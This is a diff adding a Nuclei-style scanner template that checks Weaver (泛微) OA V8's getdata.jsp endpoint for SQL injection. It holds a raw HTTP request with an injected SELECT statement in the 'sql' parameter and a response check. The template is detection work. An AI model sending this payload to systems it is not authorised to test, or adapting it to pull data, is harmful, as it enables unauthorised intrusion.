@@ -1,0 +1,30 @@
+id: poc-yaml-weaver-oa-v8-sqli
+info:
+  name: 泛微OA V8 getdata.jsp SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects a SQL injection vulnerability in 泛微OA V8's getdata.jsp endpoint.
+
+variables:
+  r1: "{{rand_int(111111, 999999)}}"
+  r2: "{{rand_int(111111, 999999)}}"
+  result: "{{to_number(r1) * to_number(r2)}}"
+
+http:
+  - raw:
+      - |
+        GET /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20{{r1}}*{{r2}}%20as%20id%20from%20HrmResourceManager HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei Security Scanner
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{result}}"
+        part: body
